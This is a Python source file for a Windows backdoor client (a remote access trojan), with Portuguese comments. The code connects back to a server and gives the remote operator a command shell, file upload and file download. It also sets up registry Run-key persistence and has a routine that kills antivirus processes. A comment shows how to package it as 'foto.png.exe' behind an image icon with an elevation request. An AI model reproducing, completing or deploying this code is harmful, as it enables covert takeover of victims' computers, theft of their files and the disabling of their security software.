#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# código do cliente
# se cair -> reconecta
# ao reiniciar o pc -> reconecta


import socket
import os
import time
import subprocess
import tempfile

nome_arquivo='backdoor.exe'
TEMPDIR = tempfile.gettempdir()

'''
 pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
 testar ->
--uac-admin           Using this option creates a Manifest which will
                        request elevation upon application restart.
  --uac-uiaccess        Using this option allows an elevated application to
                        work with Remote Desktop.


    Mkdir touch >
    Print stderr + stdout no lado do cliente para que no lado do servidor não trave .
'''

def kill_antivirus():
    with open('av.txt') as f:
        avs = f.read()
        avs = avs.split('\n')
    processes=get_output('TASKLIST /FI "STATUS eq RUNNING"')
    ps = []
    for i in processes.split(' '):
        if (".exe" in i):
            ps.append(i.replace('K\n','').replace('\n',''))
    for av in avs:
        for p in ps:
            if(p == av):
                subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)


def persistencia(os):
    if(os == 'nt'):
        if(not os.getcwd() == TEMPDIR):
            subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
            FNULL = open(os.devnull,'w')
            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)

    elif(os == 'posix'):
        pass

def conecta(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[+] Conectado :)')
        return s
    except socket.error as erro:
        return None

def executa(socket):
    while True:
        try:
            dados = socket.recv(1)
            if(not dados): # servidor desconectou, recomeça
                return
            else:
                try:
                    if(dados=='1'): # upload
                        l = socket.recv(1024)
                        nome_arquivo = l.split('+/-')[0]
                        print(nome_arquivo)
                        f = open(nome_arquivo,'wb')
                        l = l.split('+/-')[1]
                        j = socket.recv(1024)
                        l = l + j
                        while (l):
                            f.write(l)
                            l = socket.recv(1024)
                        f.close()

                    elif(dados=='2'): # shell
                        while True:
                            dados = socket.recv(1024)
                            if(not dados or dados=='exit'):
                                break
                            if(dados == 'shell'):
                                pass
                            else:
                                if(dados.split(' ')[0] == 'cd'): # trocar de diretorio
                                    try:
                                        pasta = (dados.split(' ')[1])
                                        if(os.path.isdir(pasta)):
                                            caminho = os.chdir(pasta.rstrip('\n'))
                                            local = os.getcwd()
                                            socket.send(local)
                                        else:
                                            socket.send('caminho não existe\n'+ os.getcwd())
                                    except Exception as e:
                                        socket.send('Error -> '+ e)
                                else: # executa o comando
                                    comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                                    retorno = comando.stdout.read() + comando.stderr.read()
                                    if(retorno == ''):
                                        socket.send('feito')
                                    else:
                                        socket.send(retorno)

                    elif(dados=='3'): # Download
                        arquivo = socket.recv(1024)
                        if(os.path.isfile(arquivo)):
                            socket.send('True')
                            f = open(arquivo, 'rb')
                            l = f.read(1024)
                            while(l):
                                socket.send(l)
                                l = f.read(1024)
                            f.close()
                            print('envio completo')
                            socket.shutdown(socket.SHUT_WR)
                            
                        else:
                            socket.send('False')

                    elif(dados=='4'): # Killav
                        #kill_antivirus()
                        pass
                    else:
                        print(dados)

                except:
                    return
        except: # algum erro ocorreu, recomeça
            return

def main():
    ip='127.0.0.1'
    porta=1025
    while True:
        conexao = conecta(ip, porta)
        if(conexao):
            executa(conexao)
        else:
            time.sleep(5)

if __name__=='__main__':
    if(os.name == 'nt'):
        persistencia('nt')
    elif(os.name == 'posix'):
        persistencia('posix')
    main()
